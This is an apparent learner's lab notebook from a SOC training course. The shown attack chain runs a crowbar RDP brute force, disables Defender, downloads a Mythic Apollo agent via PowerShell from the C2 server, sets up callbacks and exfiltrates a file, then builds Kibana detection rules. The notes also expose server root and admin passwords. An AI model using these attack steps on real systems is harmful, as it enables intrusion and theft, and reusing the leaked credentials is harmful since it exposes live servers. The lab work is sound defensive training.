+INTRODUCTION -brief introduction to Command and Control (C2)
+  • What? -MITRE ATT&CK: "The adversary is trying to communicate with compromised systems to control them.
+  Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses."" (https://attack.mitre.org/)
+  • Why? -So that they can perform additional actions and be one step closer to there objective (i.e. Credential Access, Lateral Movement, Exfiltration, Impact or Malware)
+  • Common Tools/Frameworks used in the wild:
+    1. Metasploit (by Rapid 7) -penetration testing framework 
+    2. Cobalt Strike (by Fortra) -adversary simulation and pentesting
+      (https://www.cobaltstrike.com/)
+      NOTE: that because this is often seen, the industry has also come up with mitigations against it.
+        (i.e. The DFIR Report, https://thedfirreport.com)
+    3. Sliver (by Bishop Fox) -open source alternative to Cobalt Strike
+      (https://bishopfox.com/tools/sliver)
+    4. Mythic -"a multiplayer, command and control platform for red teaming operations. It is designed to facilitate a plug-n-play architecture where new agents, communication channels, and modifications can happen on the fly."
+    "Fundamentally, Mythic uses a web-based front end (React) and Docker containers for the back-end. A GoLang server handles the bulk of the web requests via GraphQL APIs and WebSockets. This server then handles connections to the PostgreSQL database and communicates to the other Docker containers via RabbitMQ. This enables the individual components to be on separate physical computers or in different virtual machines if desired."
+      (https://docs.mythic-c2.net/)
+
+_____________________________________________________________________
+9/19/2024
+How To Create an Attack Diagram | Day 19
+  https://youtu.be/jv-qiugJGHg?feature=shared
+DIAGRAM -use Draw.io to create a logical diagram of the Attack that will be use in the course (may change over time)
+    https://www.draw.io
+  Phase 1. Initial Access
+    a. Attacker will use RDP to Brute Force its way into a Windows Server
+    b. Attacker will Successfully Authenticate itself
+  Phase 2. Discovery
+    Attacker will discover info located on the Windows Server using the  commands:
+      whoami
+      ipconfig
+      net user
+      net group
+  Phase 3. Defense Evasion
+    Attacker will use RDP to Disable Defender on the Windows Server
+  Phase 4. Execution
+    a. Attacker will use Powershell IEX on the Windows Server
+    b. ...to download the Mythic Agent onto the Windows Server
+    c. ...and activate that agent
+  Phase 5. Command and Control
+    Establish C2
+  Phase 6. Exfiltration
+    Download a fake password file called password.txt
+
+_____________________________________________________________________
+9/20/2024
+Mythic Server Setup Tutorial | Day 20
+  https://youtu.be/JKO1pZ45_5I?feature=shared
+    (BTW the current total Vultr charges are $99.26 at 12:14am for the 5 computes) 
+DEPLOY -Ubuntu Server 24.02 (Cloud Compute Shared CPU, TorontoRegular Cloud Compute) 
+  Image: Ubuntu 24.02, 280GB SSD, 2 CPU, 4GB, 2TB Bandwidth ($20/m)
+    NOTE: Steven said; "Mythic recommends 2 CPUs and 4GB"
+  Additional Features: none
+  Server Setting: default ("everybody have access to the server")
+  Server Hostname & Label: MYDFIR-MYTHIC
+  MYDFIR-MYTHIC Overview
+    IP Address: 216.128.184.80
+    Username: root
+    Password: fH6@ZibzENS{N}A]      
+    Netmask: 255.255.254.0
+    Gateway: 216.128.184.1
+DEPLOY -Kali Linux Attacker Laptop
+  DOWNLOAD -Kali Linux, kali-linux-2024.3-vmware-amd64
+    https://www.kali.org/get-kali/#kali-virtual-machines
+    Extract with 7-zip
+      (I never noticed how big these premade Kali's are - 14.4G)
+      (I moved this to "Mickey\software")
+  INSTALL -Kali 
+    Double-Click on the "kali-linux-2024.3-vmware-amd64.vmx" file and it opens in VMWare
+      Username: kali
+      Password: kali
+  VERIFY -MYDFIR-MYTHIC install from the console on the Vultr website
+    Compute > MYDFIR-MYTHIC > [RC on console icon (upper right)] > Login
+  CONFIGURE -MYDFIR-MYTHIC from local Powershell and SSH into it
+    PS> ssh root@216.128.184.80
+      ("yes" and password)
+    PS> clear
+    PS> apt-get update && apt-get upgrade -y
+    PS> clear
+    INSTALL -Prerequisites for Mythic
+      PS> apt install docker-compose
+      PS> apt install make
+    INSTALL -Mythic from Github
+      PS> git clone https://github.com/its-a-feature/Mythic
+      PS> ls
+      PC> cd ./Mythic
+      PS> ls
+      PS> ./install_docker_ubuntu.sh
+      PS> make
+        NOTE: this causes an error
+          "docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?."
+      PS> systemctl status docker
+        NOTE: Docker is Loaded, but not Active, so it'll need to be restated
+      PS> systemctl restart docker
+      PS> systemctl status docker
+        NOTE: Docker is Loaded & Active (running)
+      PS> make
+      PS> ./mythic-cli start
+CONFIGURE FIREWALL -in Vultr to "tighten up security a little; to only allow our computer and the other agents to communicate with Mythic. Don't need the whole internet to scan and try to connect into our box"
+  Vultr > Compute > MYDFIR-MYTHIC > Settings > Firewall > Manage > [Add Firewall Group]
+    Description: MyDFIR-Mythic-Firewall
+      [Add Firewall Group]
+    Inbound IPv4 Rules
+      TCP, 1-65535, My IP, note=Mythic, [+]     
+        (I added a note with each computer's name for reference...)
+        NOTE: Steven opened Compute in another Tab for easier C&P
+      TCP, 1-65535, Custom, 216.128.178.5, note=MYDFIR-WIN-RUDI, [+]
+      TCP, 1-65535, Custom, 216.128.176.14, note=MYDFIR-Linux-RUDI, [+]
+    Vultr > Compute > MYDFIR-MYTHIC > Settings > Firewall > (drop-down)
+      {...: MyDFIR-Mythic-Firewall} 
+        (make sure the Firewall is selected)
+      [Update Firewall Group]
+LOGIN to Mythic from a Browser on port 7443
+  216.128.184.80:7443
+    NOTE: This will cause a Browser Error (Firefox, Brave is similar)
+      "HTTPS-Only Mode Alert
+      Secure Site Not Available
+        You’ve enabled HTTPS-Only Mode for enhanced security, and a HTTPS version of 216.128.184.80:7443 is not available.
+        Warning: Potential Security Risk Ahead
+          [Advanced]
+          [Accept the Risk and Continue]
+    NOTE: see Connection Documentation at
+      https://docs.mythic-c2.net/installation/connecting
+    NOTE: "The default username is mythic_admin and the default password is randomized. The password is stored in Mythic/.env after first launch, but you can also view it with sudo ./mythic-cli config get MYTHIC_ADMIN_PASSWORD. You can opt to set this before you initially start if you want (or you can change this later through the UI) by setting that environment variable before staring Mythic for the first time."
+      PS> pdw                     ~in Powershell/Term: Print Working Dir
+        /root/Mythic 
+      PS> ls                      ~ls will NOT bring up .env (its hidden)
+      PS> ls -la                  ~list "long" & "all" (now its there)
+      PS> cat .env
+        ...
+        MYTHIC_ADMIN_PASSWORD="19zxRbPJ27UZy9LBsVhI9R5ZmusBmV"
+        MYTHIC_ADMIN_USER="mythic_admin"
+  username: mythic_admin
+  password: 19zxRbPJ27UZy9LBsVhI9R5ZmusBmV
+(for this lesson, all we're doing is changing Mythic Operation Name (upper middle) from "Operation Chimera" to "Operation MYDFIR"
+
+_____________________________________________________________________
+9/21/2024
+Mythic Agent Setup Tutorial | Day 21
+  https://youtu.be/85x0NLj2zUo?si=HGDt_uFMr-YVfm2t
+    (BTW the current billing for Vultr is $106.38 at 12:02am)
+CREATED -Fake Password file on the Windows Server MYDFIR-WIN-RUDI
+  Vultr > Compute > MYDFIR-WIN-RUDI > [console icon] > (login to Windows)
+    Create a text file in Documents called: "passwords"
+      Type the single password: "Winter2024!"
+      Save & Close
+    Change Windows Server password for the Admin Account to "Winter2024!"
+        Start > User (Administrator) > Change Account Settings > Sign-in options > Password > [Change]
+          Password: Winter2024!
+            hint: seasons
+            [Next] & [Finish]
+              NOTE: this generates a Security Error
+                "The password you entered doesn't meet the password policy requirements. Try one that's longer or more complex."
+        Change Security Policy
+          Edit Group Policy > Computer Config > Windows Settings > Security Settings > Account Policies > Password Policy
+            Minimum Password length: 5
+            Password must meet complexity requirements: Disabled
+        Change password again > ... > Sign in options > Password 
+          (this time it took the change)     
+    Exit Console
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+NOTE: The rest of this lesson and the next 7 days are going to be done on my laptop from a differant location. This means changing the firewall rules for a different IP address. And as I switched out Windows for Debian on my Laptop, I'll be learning that along the way.
+  Firewalls
+    Vultr > MyDFIR-ELK > Settings > Firewall > (manage) > 30-Day MyDFIR Challenge
+      TCP, 1-65535, 71.75.xxx.xxx, Note=MY IP Cheerful
+      SSH, 22, 71.75.xxx.xxx, Note=MY IP Cheerful
+    Vultr > MyDFIR-ELK > Settings > Firewall > (manage) > MyDFIR-Mythic-Firewall
+      TCP, 1-65535, 71.75.xxx.xxx, Note=MY IP Cheerful
+      SSH, 22, 71.75.xxx.xxx, Note=MY IP Cheerful
+        (probably didn't need that one. I didn't have one from my home IP...)
+    (according the Vultr Information note, "Please note: rule updates may take up to 120 seconds to propagate to all servers")
+  Kali -Attack Laptop (re-do the work from Day 20)
+    PREREQUISTE- VMware will need to be installed to follow the Lesson. 
+      (Currently I have VBox, but more experience with VMware would be good...)
+      DOWNLOAD -VMware Workstation Pro
+        https://support.broadcom.com/group/ecx/downloads
+        https://support.broadcom.com/group/ecx/productdownloads?subfamily=VMware%20Workstation%20Pro 
+          VMware Workstation Pro 17.0 for Personal Use (Linux) 17.6
+            [download cloud icon] 
+            Release Level: 522392
+      VERIFY -Hash
+        cd ./Downloads
+        ls-l
+        sha256sum
+          5e9e8e01278bef6408a360ff2f56218c2ee62854735be8d9cbe2dc61811ca0dc
+            (copy the generated hash > Browser > CTL+F (find) > paste hash)
+          (JOY..)
+      MODIFY -Permissions on the file to allow it to execute
+        NOTE: there are 2 ways to do this:
+          1. GUI -in File Manager (Thundar for XFCE) > Downloads > [RC on the file] > Properties > Permission Tab > [check "Allow this file to runs a program"]
+          2. CLI -Terminal
+            cd ./Downloads           ~if not already in the Downloads folder
+            ls -l                    ~lists files in long format 
+            chmod u+x VMware-Workstation-Full-17.6.0-24238078.x86_64.bundle
+                                     ~grants execute permission to the owner
+              (also currently -rw-r--r-- (644) change to 744 or even 700)
+      INSTALL -VMware Workstation Pro v17.6 (with CLI)
+        cd ./Downloads               ~if not already in the Downloads folder
+        ./VMware-Workstation-Full-17.6.0-24238078.x86_64.bundle
+          NOTE: the icon in XFCE for VMware didn't work. The instructions oVMware website said to use:
+            sh VMware-Workstation-Full-17.6.0-24238078.x86_64.bundle
+          I tried this too and the the installer Wizard came up. (huh?...)  
+          Follow the Wizard and when asked for a License Key, select "License for pwersonal use"
+    DOWNLOAD -Kali Linux, kali-linux-2024.3-vmware-amd64
+      https://www.kali.org/get-kali/#kali-virtual-machines
+      Extract with 7-zip
+    INSTALL -Kali 
+      Double-Click on the "kali-linux-2024.3-vmware-amd64.vmx" file and it opens in VMWare
+        Username: kali
+        Password: kali
+      (I was able to update, full-upgrade, and install the new Kernle, nut now I can't get the networking to work -spent 1 hour on it -switching to VBox Kali instead - update, upgrade, but I'm not playing with the kernle this time - I'll figure out the VMware later)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+9/22/2024
+CONTINUED -with Mythic Agent Setup Tutorial | Day 21
+MODIFY -the Brute Force Word List that comes with Kali in VBox
+  Kali Linux VM: 2GB, 2CPU, 80GB RAM, NAT IP: 10.0.2.15
+  VBox > Kali > Terminal 
+    cd /usr/share/wordlists/
+    ls                                 ~display all the available wordlists (14)
+    sudo gunzip rockyou.txt.gz         ~extract a very popular wordlist file
+    cat rockyou.txt | less             ~most popular passwords 1 page at a time
+    head -50 rockyou.txt               ~first 50 entries of file
+    head -50 rockyou.txt > /home/kali/mydfir-wordlist.txt
+    cd ~                               ~change to home directory
+    ls
+    cat mydfir-wordlist.txt            ~display wordlist (to verify)
+    nano mydfir-wordlist.txt           ~edit the list 
+      (cheating a bit, by adding "Winter 2024!" to an already shortened list)
+        nano rockyou.txt               
+          (edit rockyou.txt, go to the last line (^V), append with "Winter2024!", and save the file (^X) as "rockyou2.txt" 
+        cp ./rockyou2.txt /home/kali/rockyou2.txt      ~copy to home directory  
+INSTALL -a tool to brute force the password list called Crowbar
+  sudo apt install -y crowbar    
+    (this throws an error, MyDfir forgot to update & Upgrade, so did I...)
+  sudo apt update && sudo apt upgrade -y         ~take FOREVER...
+  sudo apt autoremove
+  VBox > Kali > Snapshot               ~so I don't have to wait next time
+  sudo apt install crowbar             ~a brute forcing tool for penetration tests
+  which crowbar                        ~is a package installed? where is it?
+    /usr/bin/crowbar
+  crowbar -h                           ~help menu for crowbar
+ATTACK Phase 1a (Initial Access) -use crowbar to brute force the password of the Windows Server (MYDFIR-WIN-RUDI) from the Kali Linux Laptop
+  crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s 216.128.178.5/32
+    NOTE: crowbar                      ~name of tool
+          -b rdp                       ~target service to use
+          -u Administrator             ~username (static, not in a file)
+          -C mydif-wordlist.txt        ~password file (with multiple passwords)
+          -s 216.128.178.5/32          ~server (static target, not in a file)
+      (all right, here we go. it took just 11 seconds)
+    2024-09-22 22:47:01 START
+    2024-09-22 22:47:01 Crowbar v0.4.2
+    2024-09-22 22:47:01 Trying 216.128.178.5:3389
+    2024-09-22 22:47:12 RDP-SUCCESS : 216.128.178.5:3389 - Administrator:Winter2024!  
+ATTACK Phase 1b (Initial Access) -use Linux RDP tool (xfreerdp) to open a RDP session from Kali to Windows
+  xfreerdp /u:Administrator /p:Winter2024! /v:216.128.178.5:3389 
+    "Do you trust the above certificate?"    "Y" for "yes"
+    NOTE: This opens a new RDP window in Kali with a GUI interface
+ATTACK Phase 2 (Discovery) -use the open RDP session to run commands in Windows with Command Prompt and discover the network, user, and 
+  CMD> whoami                          ~Administrator (well we knew that one...)
+  CMD> ipconfig                        ~network data
+  CMD> net user
+  CMD> net group
+  CMD> net user Administrator          ~user info
+  (just for fun, I added a new admin account for u:"BadGuy" p:"MyDFIR 30Day Challenge" ...)
+ATTACK Phase 3 (Defense Evasion) -to disable Windows Defender either with the CLI or with the GUI (using GUI this time...)
+  Search > "Security" for Windows Security > Virus & Threat protection > Manage Settings
+    (Turn everything off...)
+ATTACK Phase 4 (Execution) -build a Mythic Agent from the Mythic Server web GUI
+  1. Check for installed Payloads
+      Browser > https://216.128.184.80:7443 > login 
+        (this is the program GUI, not Vultr server session...)
+          username: mythic_admin
+          password: 19zxRbPJ27UZy9LBsVhI9R5ZmusBmV
+        Mythic GUI > Payloads          ~nothing here yet, need to download some...
+  2. Install Agent                     ~Google for "mythic agents"
+    NOTE: choose a Mythic Agent from the Mythic Github website:
+      https://github.com/MythicAgents
+      Mythic Agents > Mythic Agents Organization > Agent Capabilities Matrix
+        (in this Lesson we're picking "Apollo" because its can target Windows with http, smb & tcp, using .exe & shellcode)
+      NOTE: Appolo Agent information & installation instructions are at: 
+        https://github.com/MythicAgents/Apollo
+        "From the Mythic install directory, use the following command to install Apollo as the root user:
+          ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+        Once installed, restart Mythic to build a new agent."
+    Vultr > MYDFIR-MYTHIC > console > login
+      Username: root
+      Password: fH6@ZibzENS{N}A]
+      cd Mythic
+      cd mythic-cli                    ~remember all command must come from here
+      ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+        "Successfully installed service!"       (JOY...)
+  3. Install C2 Profile                ~Google for "mythic c2 profile"
+    NOTE: choose a Mythic C2 Profile from the Mythic Github website:
+      https://github.com/MythicC2Profiles
+        (in this Lesson we're picking "http")
+      NOTE: HTTP C2 Profile information & installation instructions are at: 
+        https://github.com/MythicC2Profiles/http      
+        "It simply provides a way to get HTTP messages off the wire and forward them to the Mythic server"
+    Vultr > MYDFIR-MYTHIC > console
+      cd Mythic
+      ./mythic-cli install github https://github.com/MythicC2Profiles/http
+        "Successfully installed service!"       (JOY...)
+  4. Create Payload
+    Mythic GUI > Payload/C2 Services   ~now "Apollo", and "http" show up
+    Mythic GUI > Payloads > [Actions drop-down] > "Generate New Payload"
+      Select Target Payload Type
+        Windows > [Next] (bottom left)
+        Agent: apollo
+        Build Parameter: WinExe > [Next]
+      Available Commands/Commands Included
+        (in this Lesson we're using all the commands) > [Next]
+        NOTE: Mythic/Apollo allow for selectable commands o keep the file size smaller
+      Select C2 Profile
+        Include? > [Yes] (slider, top left)
+        Callback Host: http://216.128.184.80     ~MYDFIR-MYTHIC Server (http)
+        Callback Interval in seconds: 10
+        Callback Port: 80                        ~http
+        HTTP Headers: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
+        Kill Date: 09/23/2025
+        [Next]
+      Payload Review
+        Filename: service-RUDI.exe
+        description: MyDFIR 30 Day Challenge Payload/Agent
+        [Create Payload]
+          "Payload successfully built!"
+          "Agent ready for download"
+          "Download here"
+        [RC] > Copy Link (or Copy Address in Windows) > paste to notepad...
+          https://216.128.184.80:7443/direct/download/133e49a5-af02-48e4-8524-59c9d94b4748
+            (this is a very long URL - we'll need to make a file that is shorter)
+    Vultr > MYDFIR-MYTHIC > console
+      pwd                              -print working directory
+      cd ~                             ~change to home directory (root)
+      wget https://216.128.184.80:7443/direct/download/133e49a5-af02-48e4-8524-59c9d94b4748
+        NOTE: This throws the "ERROR: Cannot verify 216.128.184.80's certificate"
+          "ERROR: certificate common name '' doesn't match requested host name '216.128.184.80'
+          "To connect to 216.128.184.80 insecurely, use '--no-check-certificate'"
+      wget https://216.128.184.80:7443/direct/download/133e49a5-af02-48e4-8524-59c9d94b4748 --no-check-certificate
+        NOTE: this "gets" the file '133e49a5-af02-48e4-8524-59c9d94b4748' and downloads it to the root directory
+      ls                               ~shows the above file
+      file 133e49a5-af02-48e4-8524-59c9d94b4748
+        "133e49a5-af02-48e4-8524-59c9d94b4748: PE32 executable ..."
+      mv 133e49a5-af02-48e4-8524-59c9d94b4748 svchost-RUDI.exe
+      mkdir 1                          ~make directory "1"
+      mv svchost-RUDI.exe 1/
+        NOTE: the "file" command determines file type through inspection of the binary. the 1st "mv" command renames the file. the 2nd "mv" moves the file to the new directory (this could've been done in one "mv") 
+  5. Create Server for Payload
+    Vultr > MYDFIR-MYTHIC > console
+      cd 1                             ~if not already in the new "1" directory  
+        NOTE: in the Lesson, MyDFIR has a problem in Step 7 because he forgot to  open a port in the firewall of the MYDFIR-MYTHIC server
+        (when troubleshooting connections problems, remember to check firewall  rules in any relevant location. i.e the cloud platform, vm instances, local computers)
+      ufw 9999
+      python3 -m http.server 9999      
+        NOTE: this uses a python module to create webserver and use the port 9999 to access it
+          (that was "just" opened to allow the http traffic - port 9999 was picked because it doesn't have a pre-determined use and not for a particular reason)
+        NOTE: Ctrl+C stops the python webserver
+  6. Re-Establish a RDP session from the Kali Laptop if it isn't  already open
+    Kali > Terminal
+      xfreerdp /u:Administrator /p:Winter2024! /v:216.128.178.5:3389 
+  7. Force Windows to use Powershell and download the payload from the Mythic Server 
+    Kali > FreeRDP session window > Windows > Search > Powershell
+      PS> Invoke-WebRequest -Uri http://216.128.184.80:9999/svchost-RUDI.exe -OutFile "C:\Users\Public\Downloads\svchost-RUDI.exe" 
+        NOTE: Invoke-WebRequest        ~sends HTTP and HTTPS requests to the web
+              -Uri http:// ... 9999    ~the Mythic server and port
+              /svchost-RUDI.exe        ~file we are requesting
+              -OutFile                 ~send output results to a file (like '>')
+              C:\Users\ ... RUDI.exe   ~the file for the output (I'd pick another)
+        NOTE: in the Lesson, this will throw an Error if the MYDFIR-MYTHIC server doesn't have the port 9999 open in ufw. Remember to check both the Vultr Firewall Groups and well as the VM instances for connection problems
+      PS> cd C:\Users\Public\Downloads 
+      PS> dir                          ~both "dir" and "ls" work
+        (JOY... The file is there... In the right directory...)
+ATTACK Phase 5 (Command & Control) -Run command to establish a connection back to Mythic
+    PS> .\svchost-RUDI.exe
+  VERIFY -the connection with Task Manager >
+    Windows > Search > Task Manager > Details >(scroll down processes to "s")
+      Name              PID   Status   Username       Memory  Description
+      svchost-RUDI.exe  2532  Running  Administrator  9380K   Appolo
+  VERIFY -the connection with CMD
+    netstat -anob                    -command shows the state of all sockets
+    netstat -anob | findstr 216.128.184.80     ~just the part I'm looking for
+      TCP    216.128.178.5:65392    216.128.184.80:80   SYN_SENT
+        (a socket with a SYN_SENT status is very likely one that has a problem with the Firewall - in this case block a port)
+    TROUBLESHOOT -this is coming from Windows to Mythic by http, do we'll start by opening port 80
+      root@MYDFIR-MYTHIC:~# ufw allow 80
+  VERIFY -the Windows connection to Mythic with CMD
+    netstat -anob | findstr 216.128.184.80
+      TCP    216.128.178.5:49241    216.128.184.80:80      ESTABLISHED     6780
+  VERIFY -the connection with the Mythic GUI
+    Notification: New Callback (1) Administrator@MYDFIR-WIN-RUDI with pid 6780
+    Callback (phone icon) is show the the connection with MYDFIR-WIN-RUDI with pid 6780 and a time since the last checkin 
+      (...and an IP of 216.128.178.5)
+        (JOY... finally...)
+        NOTE: PID is now 6780 in both CMD/netstst & Task Manager
+  INTERACT -with Windows from the Agent on the Mythic GUI
+    https://216.128.184.80:7443
+    Callback > Interact > [keyboard icon, top left]
+      (from the Mythic Github > Mythic Agents > Apollo page)
+      NOTE: type commands in the "Task an agent..." Field (bottom left)
+      (remember to wait for the agent to respond)
+      Callback> whoami                 
+        "Local Identity: MYDFIR-WIN-RUDI\Administrator
+        Impersonation Identity: MYDFIR-WIN-RUDI\Administrator"
+      Callback> ifconfig
+        Status  Name                   IPv4             DNS           Gateway
+        Up      Ethernet Instance 0    216.128.178.5    108.61.10.10  16.128.178.1
+          (JOY...)
+      Callback> screenshot
+        (took a moment longer, "processing, waiting for more messages", but I have a screenshot of MYDFIR-WIN_RUDI)
+ATTACK Phase 6 (Exfilltration) -of the password file in the Documents folder of the Windows computer to the Mythic GUI
+  (looking through the Apollo commands, "download" seems the obvious choice)
+  Mythic GUI > Callback > Interact > Task an agent...
+    download C:\Users\Administrator\Documents\passwords.txt
+      (checked Kali/FreeRDP/Windows session > RC on the file > Properties)
+  VERIFY -the completed task shows a Preview of the download
+    "Winter2024!"
+  VERIFY -clicking on the "paperclip" icon (top left), shows the actual file.
+    Clicking on it brings up a larger Preview window
+    "Winter2024!"
+      (YET MORE JOY...)
+
+_____________________________________________________________________
+9/23/2024
+How To Create Alerts and Dashboards in Kibana | Day 22 (4/4)
+  https://youtu.be/WcVuUamMApA?feature=shared
+CREATE Alert -for Windows Telemetry generated by Mythic
+  Elastic Search GUI > [Menu] > Analytics > Discovery > New (top right)
+    NOTE: this will reset everything for this Lesson
+    QUERY -for the Mythic C2 for the last 30 days
+      (we're cheating a little bit because we already know the Mythic IP address, binary file, etc.)
+      Query> "svchost-RUDI.exe"        ~16 documents
+        no data 
+        TROUBLESHOOT -the are no record of svchost-RUDI.exe
+          1. MAL1 Laptop was was shut down, so lets restart all the apps
+            a. Browser/Vultr -everything seems to be running...
+            b. VBox/Kali -used xfreerdp to log into Windows
+              CMD> netstat -anob | findstr ESTABLISHED
+                (NO JOY... )
+                Vultr/MYDFIR-MYHIC/console
+                  restarted Mythic Server python HTTP Webserver
+                    python3 -m http.server 9999 
+                VBox/Kali/xfreerdp/MYDFIR-WIN-RUDI Server
+                  redownload & executed svrhost-RUDI.exe
+                Vult > MYDFIR-MYTHIC > Settings > Firewall > Firewall group
+                  checked firewall rules (especially cheerful...)
+                MYDFIR-MYTHIC Server
+                  checked current firewall rules
+                    "ufw status" and port 22/tcp is allowed
+                Mythic Server
+                  opened local terminal and ssh in to see if I could
+                    ssh root@216.128.184.80
+            c. checked YouTube page for MyDFIR/Day 22 and read the comments
+              -@illflowking had the same problem
+              -@otorisamson4253 said he too, had the same problem and fixed by    restarting the Vultr/Windows Server and Updating/Refreshing the Elastic Search
+        (JOY...) 
+          NOTE: that the PIDs will all be new now...
+          (also, I wunder if restarting windows was needed or just restarting sysmon...)
+      Query> "svchost-RUDI.exe"        ~112 documents
+        (we're looking for the process create event, so sort the documents from oldest to newest. the 4th one shows "svchost-RUDI.exe" so expand it to investigate it...)
+        event.code: 11
+        event.provider: Microsoft-Windows-Sysmon
+        message: File created:
+                 RuleName: -
+                 UtcTime: 2024-09-23 18:46:41.701
+                 ProcessGuid: {90a66de7-94f4-66f1-7c0d-000000000900}
+                 ProcessId: 3580
+                Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                 TargetFilename: C:\Users\Public\Downloads\svchost-RUDI.exe
+                 CreationUtcTime: 2024-09-23 18:46:41.701
+                 User: MYDFIR-WIN-RUDI\Administrator
+        winlog.event_data.TargetFilename: 
+                 C:\Users\Public\Downloads\svchost-RUDI.exe         
+      Query> "svchost-RUDI.exe" and event.code: 1       ~7 documents
+        (expand the 1st document)
+        event.code: 1
+        winlog.event_data.CommandLine:
+                 "C:\Users\Public\Downloads\svchost-RUDI.exe"
+        winlog.event_data.Description: Apollo
+        winlog.event_data.OriginalFileName: Apollo
+        winlog.event_data.ParentProcessId:3580
+        winlog.event_data.ProcessId: 2532
+        winlog.event_data.ParentImage: 
+        winlog.event_data.Hashes
+                 SHA1=F631319A44B12EB1A33E428DABCA80D7126306C2,MD5=FFCF8013745C26956A6B9518C6ECD20E,SHA256=921B0470644579DA952F1B5D0BB032CDB03C3D3471A539C6E5E453DF117FBEE8,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
+        winlog.event_data.ParentImage: 
+                 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        winlog.event_data.ProcessGuid:
+                 {90a66de7-c2b3-66f1-cc0d-000000000900}
+      NOTE: investigate OSINT by C&P and checking with VirusTotal
+        virustotal.com > Search Tab > paste
+          "No matches found"
+            (this is because this is a newly generated agent, and hashes are trivial to change for an attacker, but you should still check...)
+      Query> "svchost-RUDI.exe" and event.code: 1 and winlog.event_data.Hashes *256=921B0470644579DA952F1B5D0BB032CDB03C3D3471A539C6E5E453DF117FBEE8,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744*
+        (the "*" on either end of the SHA256 hash allows us to only query for a particular portion of a field - i think...)
+      Query> event.code: 1 and (winlog.event_data.Hashes *256=921B0470644579DA952F1B5D0BB032CDB03C3D3471A539C6E5E453DF117FBEE8,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744* or winlog.event_data.OriginalFileName: Apollo)
+        (remove the "svchost-RUDI.exe" to tighten up the results)
+        (the Parentheses nests one Boolean in another Boolean)
+        Save the search query
+          [Save] > Save Search > "Mythic-Apollo-Process-Create"
+CREATE Rule -from the above Query
+  [Menu] > Security > Rules > Detection Rules (SIEM) > [Create new rule] > Custom Query > (this opens in the same window so just scroll down) 
+    1.Define Rule
+      Index Patterns: (leave as default)
+      Custom query: event.code: 1 and (winlog.event_data.Hashes *256=921B0470644579D  A952F1B5D0BB032CDB03C3D3471A539C6E5E453DF117FBEE8,IMPHASH=F34D5F2D4577ED6D9CEE  C516C1F5A744* or winlog.event_data.OriginalFileName: Apollo)
+      Required Fields:
+        @timestamp
+        winlog.event_data.User
+        winlog.event_data.ParentImage
+        winlog.event_data.ParentCommandLine
+        winlog.event_data.Image
+        winlog.event_data.CommandLine
+        winlog.event_data.CurrentDirectory
+        host.hostname
+          NOTE: MyDFIR opened the previous saved search another tab ([Menu] >   Recently viewed) and scrolled around in the document to get the correct   field names and sytax for the above "Required Fields" 
+          (FYI MYDFIR also initially chose message & winlog.event_data.ProcessGuid  but did not use them here...)
+            [Continue]
+    2. About Rule
+      Name: MyDFIR-Mythic-C2-Apollo-Agent-Detected
+      Description: This rule detects a potential mythic C2 apollo agent
+      Default Severity: Critical
+        [Continue]
+    3. Schedule rule
+      Runs every: 5m
+      Additional look-back time: 5m
+        [Continue]
+    4. Rule Actions
+      (leave as defaults)
+        [Create & enable rule]
+CREATE Dashboard -to show some suspicious activity
+  Panels to use:
+    event.code: 1 - Process Creates - powershell, cmd, rundll32
+    event.code: 3 - Network Connections (External)
+      any processes INITIATING a network connection outbound
+    event.code: 5001 - any Windows Defender activity that was disabled
+  QUERIES - go the [MENU] > Analytics > Discovery
+    NOTE: as before, build up the query by finding one field code at a time that works, and fixing the syntax as you go along 
+      Query 1 (1st try)
+        "event.code: 1  and (powershell or cmd or rundll32)"
+          (got lucky on that one, when queried, it just worked. to build it out some more, search for Sysmon...)
+            "event.provider:Microsoft-Windows-Sysmon"
+      Query 1 (2nd try)
+        "event.code: 1 and event.provider:Microsoft-Windows-Sysmon and (powershell or cmd or rundll32)"
+NOTE: Video @ 14:21 "Update Alert, but I'll leave that for you..."
+      Query 3 (1st try)
+        "event.code: 3" 
+      Query 3 (2nd try)
+        "event.code: 3 and and event.provider:Microsoft-Windows-Sysmon"
+          (we still needed a wait to find Initiated events. scrolling down one of the documents, winlog.event_data.Initiated looks good. the Value is "false" meaning that the Windows Server DIDN'T Initiate the connection. the value of "true" means that the Windows Server has a process calling out the first connection)
+      Query 3 (3rd try)
+        "event.code: 3  and event.provider:Microsoft-Windows-Sysmon and winlog.event_data.Initiated: true"
+          (looks good. I'm getting 12 documents, down from 29000)
+      Query 5001 (!st try)
+        "event.code: 5001"
+          (well, we only got 1 document, but that's make sure its for Defender by searching the document. yep. event.provider: Microsoft-Windows-Windows Defender)
+      Query 5001 (2nd try)
+        "event.code: 5001 and event.provider: Microsoft-Windows-Windows Defender"
+          (still work'n)
+  New Dashboard, and Visualization 1
+    [MENU] > Analytics > Dashboards > [Create dashboard] > [Create Visualization]
+      NOTE: as before, the Visualization page is mostly all Drag-n-Drop. Start by C&P on of the above Queries in the SearchQueryBar. Then grab the fields you want use and DnD them from the left list to the center. Or search for the field (or part of a field) and DnD the Result from the SearchBar down to the center. Adjust the field order, appearance, and edit the fields from the tools on the right side.
+        (MyDFIR Started with the list from Create Rule > Required Field (above, from this Lesson) and added a field. Then took some out because it was a little messy and hard to read. Below is the final Table Column Header he decided on, by DnD the "Rows" in the right table and editing thier names. BTW, remember that the default view is a Bar graph, and it needs to be changed to Table...) 
+          Rows
+            User
+            ParentImage
+            ParentCommandLine
+            Image
+            CommandLine
+            CurrentDirectory
+          Data > Number of values: 999
+          Data > Advanced > "Group remaining values as "Other" > (slider OFF)
